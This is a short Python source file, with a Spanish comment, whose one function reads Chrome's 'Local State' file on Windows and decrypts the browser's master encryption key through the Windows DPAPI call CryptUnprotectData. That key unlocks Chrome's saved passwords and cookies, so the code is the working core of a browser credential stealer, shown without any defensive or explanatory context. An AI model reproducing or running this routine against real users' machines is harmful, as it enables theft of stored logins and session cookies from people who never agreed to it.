import base64
import json
import os
import sys

import win32crypt  # Solo disponible en Windows


def get_chrome_encryption_key():
    if sys.platform == "win32":
        # Windows
        local_state_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
        )

        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state_data = json.load(file)

        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]

        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
